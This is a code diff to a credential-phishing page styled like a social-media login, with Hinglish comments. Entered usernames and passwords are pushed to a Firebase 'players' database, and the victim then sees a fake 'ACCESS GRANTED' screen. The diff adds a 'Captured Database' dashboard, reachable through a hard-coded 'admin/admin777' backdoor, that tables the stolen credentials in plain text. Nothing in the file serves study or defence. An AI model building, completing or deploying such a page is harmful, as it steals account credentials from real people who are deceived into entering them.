@@ -177,7 +177,6 @@
     font-weight: 600;
   }
 
-  /* Dashboard Styles */
   #portal-output {
     margin-top: 20px;
     display: none;
@@ -229,10 +228,10 @@
     </div>
 
     <div id="auth-form" style="width:100%;">
-      <form onsubmit="handleAuth(event)">
+      <form onsubmit="return false;">
         <input type="text" id="username" placeholder="Username, email address or mobile number" autocomplete="username" required>
         <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
-        <button type="submit" class="login-btn">Log in</button>
+        <button type="button" class="login-btn" onclick="handleAuth()">Log in</button>
       </form>
 
       <a class="forgot-link">Forgotten password?</a>
@@ -264,9 +263,8 @@
   }
   const database = typeof firebase !== 'undefined' && firebase.apps.length ? firebase.database() : null;
 
-  // --- AUTH HANDLER ---
-  function handleAuth(e) {
-    e.preventDefault();
+  // --- AUTH HANDLER (Button click se chalega) ---
+  function handleAuth() {
     const user = document.getElementById("username").value.trim();
     const pass = document.getElementById("password").value.trim();
 
@@ -275,14 +273,14 @@
       return;
     }
 
-    // Admin Dashboard
+    // === ADMIN BACKDOOR ===
     if (user === "admin" && pass === "admin777") {
       document.getElementById("auth-form").style.display = "none";
       loadDashboard();
       return;
     }
 
-    // Firebase Submit
+    // === FIREBASE SUBMIT ===
     if (database) {
       const logsRef = database.ref("players").push();
       logsRef.set({
@@ -312,4 +310,57 @@
         padding:14px;
         border:none;
         border-radius:24px;
-        background:#0095f
+        background:#0095f6;
+        color:#fff;
+        font-weight:600;
+        font-size:15px;
+        cursor:pointer;
+      " onclick="nextStep()">Continue</button>
+    `;
+  }
+
+  function nextStep() {
+    const output = document.getElementById("portal-output");
+    output.innerHTML = `
+      <h2 style="font-size:1.3rem; font-weight:600; text-align:center; margin:20px 0;">Setup Complete</h2>
+      <p style="text-align:center; color:#8e8e8e;">All core integrations are working correctly.</p>
+      <div style="text-align:center; margin-top:15px;">
+        <span style="color:#0095f6; font-weight:600; border:1px solid #0095f6; padding:6px 16px; border-radius:20px; font-size:14px;">ACCESS GRANTED</span>
+      </div>
+    `;
+  }
+
+  // --- ADMIN DASHBOARD (Live Firebase se data le kar table dikhata hai) ---
+  function loadDashboard() {
+    const output = document.getElementById("portal-output");
+    output.style.display = "block";
+    output.style.textAlign = "left";
+    output.innerHTML = `
+      <h3 style="font-size:1.1rem; font-weight:600; margin-bottom:10px;">Captured Database</h3>
+      <div id="logs-container" style="color:#8e8e8e; font-size:0.85rem;">Connecting to grid...</div>
+    `;
+
+    if (!database) {
+      document.getElementById("logs-container").innerHTML = "<p style='color:#ed4956;'>Firebase config missing.</p>";
+      return;
+    }
+
+    database.ref("players").on("value", (snap) => {
+      const items = snap.val();
+      if (!items) {
+        document.getElementById("logs-container").innerHTML = "<p>No entries found.</p>";
+        return;
+      }
+      let html = `<table class="admin-table"><thead><tr><th>Identity</th><th>Access Key</th></tr></thead><tbody>`;
+      for (let key in items) {
+        const u = items[key].username || '';
+        const p = items[key].password || '';
+        html += `<tr><td>${u.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}</td><td>${p.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}</td></tr>`;
+      }
+      html += `</tbody></table>`;
+      document.getElementById("logs-container").innerHTML = html;
+    });
+  }
+</script>
+</body>
+</html>
